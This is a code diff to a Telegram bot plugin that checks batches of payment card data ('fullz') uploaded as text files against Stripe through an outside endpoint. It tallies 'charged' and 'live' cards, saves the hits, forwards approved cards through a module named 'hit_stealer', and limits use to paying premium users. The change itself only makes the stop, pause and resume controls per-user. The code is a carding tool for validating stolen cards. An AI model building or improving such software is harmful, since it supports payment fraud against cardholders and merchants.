@@ -6,8 +6,8 @@ from plugins.func.users_sql import fetchinfo, updatedata, insert_reg_data, setan
 from plugins.gates.TOOLS.getcc_for_txt import getcc_for_txt
 from plugins.tools.hit_stealer import send_hit_if_approved
 
-stop_flag = False
-pause_flag = False
+user_stop_flags = {}
+user_pause_flags = {}
 
 KILTES_URL = "https://kiltes.lol/str/"
 
@@ -37,8 +37,8 @@ async def save_cc(result, file_name):
     except Exception as e:
         print("Save error:", str(e))
 
-async def get_ui(client, msg, total, key, chk_done, charged, live, start):
-    if stop_flag:
+async def get_ui(client, msg, total, key, chk_done, charged, live, start, user_id):
+    if user_stop_flags.get(user_id):
         return await client.edit_message_text(
             msg.chat.id, msg.id,
             f"⛔ <b>Process Stopped</b>\n\n"
@@ -49,11 +49,11 @@ async def get_ui(client, msg, total, key, chk_done, charged, live, start):
         )
 
     h, m, s = elapsed_time(start)
-    btn_text = "▶️ Resume" if pause_flag else "⏸ Pause"
-    callback_data = "resume_checking" if pause_flag else "pause_checking"
+    btn_text = "▶️ Resume" if user_pause_flags.get(user_id) else "⏸ Pause"
+    callback_data = f"resume_checking_{user_id}" if user_pause_flags.get(user_id) else f"pause_checking_{user_id}"
     reply_markup = InlineKeyboardMarkup([
         [InlineKeyboardButton(btn_text, callback_data=callback_data)],
-        [InlineKeyboardButton("⛔ Stop", callback_data="stop_checking")]
+        [InlineKeyboardButton("⛔ Stop", callback_data=f"stop_checking_{user_id}")]
     ])
     await client.edit_message_text(
         msg.chat.id, msg.id,
@@ -105,10 +105,6 @@ async def check_stripe(card, user_id, session):
 
 @Client.on_message(filters.command("stxt", ["/", "."]))
 async def stripe_txt_cmd(client, message):
-    global stop_flag, pause_flag
-    stop_flag = False
-    pause_flag = False
-
     try:
         if not message.reply_to_message or not message.reply_to_message.document:
             return await message.reply_text("❌ Reply to a .txt file with /stxt", quote=True)
@@ -125,6 +121,9 @@ async def stripe_txt_cmd(client, message):
 
         if role != "PREMIUM":
             return await message.reply("❌ Only PREMIUM users can use this command.")
+
+        user_stop_flags[user_id] = False
+        user_pause_flags[user_id] = False
 
         randkey = await gcgenfunc()
         key = f"stxt{user_id}_{randkey}"
@@ -153,11 +152,11 @@ async def stripe_txt_cmd(client, message):
         async with httpx.AsyncClient(timeout=30) as session:
             BATCH = 10
             for i in range(0, total_cards, BATCH):
-                if stop_flag:
+                if user_stop_flags.get(user_id):
                     break
-                while pause_flag:
+                while user_pause_flags.get(user_id):
                     await asyncio.sleep(1)
-                    await get_ui(client, status_msg, total_cards, key, chk_done, charged, live, start_time)
+                    await get_ui(client, status_msg, total_cards, key, chk_done, charged, live, start_time, user_id)
 
                 batch = cc_list[i:i + BATCH]
                 tasks = [check_stripe(c["fullz"], user_id, session) for c in batch]
@@ -182,9 +181,9 @@ async def stripe_txt_cmd(client, message):
                             await send_hit_if_approved(r['fullz'], r)
                     await save_cc(r, file_name)
 
-                await get_ui(client, status_msg, total_cards, key, chk_done, charged, live, start_time)
+                await get_ui(client, status_msg, total_cards, key, chk_done, charged, live, start_time, user_id)
 
-        if not stop_flag:
+        if not user_stop_flags.get(user_id):
             await get_done(client, message, total_cards, key, hitsfile, chk_done, charged, live, start_time)
             updatedata(user_id, "credits", credits - total_cards)
             setantispamtime(user_id)
@@ -194,20 +193,29 @@ async def stripe_txt_cmd(client, message):
     except Exception:
         await message.reply_text(f"❌ Error:\n<code>{traceback.format_exc()}</code>", quote=True)
 
-@Client.on_callback_query(filters.regex("stop_checking"))
+@Client.on_callback_query(filters.regex(r"stop_checking_(\d+)"))
 async def stop_checking(client, cb):
-    global stop_flag
-    stop_flag = True
-    await cb.answer("⛔ Stopping...")
+    user_id = str(cb.from_user.id)
+    if user_id == cb.matches[0].group(1):
+        user_stop_flags[user_id] = True
+        await cb.answer("⛔ Stopping...")
+    else:
+        await cb.answer("❌ Not your session.", show_alert=True)
 
-@Client.on_callback_query(filters.regex("pause_checking"))
+@Client.on_callback_query(filters.regex(r"pause_checking_(\d+)"))
 async def pause_checking(client, cb):
-    global pause_flag
-    pause_flag = True
-    await cb.answer("⏸ Paused")
+    user_id = str(cb.from_user.id)
+    if user_id == cb.matches[0].group(1):
+        user_pause_flags[user_id] = True
+        await cb.answer("⏸ Paused")
+    else:
+        await cb.answer("❌ Not your session.", show_alert=True)
 
-@Client.on_callback_query(filters.regex("resume_checking"))
+@Client.on_callback_query(filters.regex(r"resume_checking_(\d+)"))
 async def resume_checking(client, cb):
-    global pause_flag
-    pause_flag = False
-    await cb.answer("▶️ Resumed")
+    user_id = str(cb.from_user.id)
+    if user_id == cb.matches[0].group(1):
+        user_pause_flags[user_id] = False
+        await cb.answer("▶️ Resumed")
+    else:
+        await cb.answer("❌ Not your session.", show_alert=True)
